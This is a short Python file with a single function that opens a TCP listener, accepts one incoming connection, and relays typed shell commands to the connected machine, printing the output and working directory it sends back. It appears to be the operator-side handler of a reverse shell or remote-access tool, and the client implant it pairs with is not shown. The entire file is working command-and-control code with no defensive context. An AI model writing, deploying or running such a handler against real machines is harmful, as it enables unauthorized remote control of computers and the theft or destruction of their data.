# Function for listening

import socket

def listen_for_connections(host, port):
    
    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))

        s.listen(5)

        client_s, ip_address = s.accept()
        
        print(f" {ip_address[0]} connected\n")
        
        client_s.send("cd .".encode())
        current_directory = client_s.recv(2048).decode('utf-8')
        
        output = ""
        
        while output[-11:] != "MESSAGE END":
                    
            output = output + client_s.recv(2048).decode('utf-8')

        while True:
            
            print(f" {current_directory}>", end="")
            
            command = input()
            
            if command == "exit": break
            
            if command != "":
                
                client_s.send(command.encode('utf-8'))
                    
                current_directory = client_s.recv(2048).decode('utf-8')
                    
                output = ""
                
                while output[-11:] != "MESSAGE END":
                    
                    output = output + client_s.recv(2048).decode()
                    
                for line in output[:-12].split("\n"):
                    
                    print(f" {line}")
            
                print()
        
        print()

    except:
        
        print("\033[31m\n [!] session quit unexpectedly\033[39m\n")